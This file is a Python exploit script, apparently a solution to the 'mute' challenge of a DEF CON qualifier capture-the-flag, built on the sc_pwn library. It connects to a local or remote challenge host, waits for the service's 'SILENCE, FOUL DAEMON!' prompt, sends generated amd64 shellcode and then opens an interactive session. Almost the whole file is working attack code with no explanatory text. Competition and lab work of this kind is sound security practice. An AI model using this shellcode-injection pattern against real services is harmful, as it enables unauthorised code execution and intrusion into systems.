#!/usr/bin/env python
# https://github.com/shift-crops/sc_pwn/blob/master/sc_pwn.py
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.92.131','port':8080}, \
                        remote  = {'host':'mute_9c1e11b344369be9b6ae0caeec20feb8.quals.shallweplayaga.me','port':443})
env.select()

#==========
def attack(cmn):
    sc = ShellCode('amd64',0x1000)
    shellcode  = sc.read(0, 0xdeadbeef, 0x500)
    shellcode += sc.padding()
    
    cmn.read_until('SILENCE, FOUL DAEMON!\n')
    cmn.sendln(shellcode)
        
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    #sh = Shell(cmn)
    #sh.select()
    #del(sh)
    Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
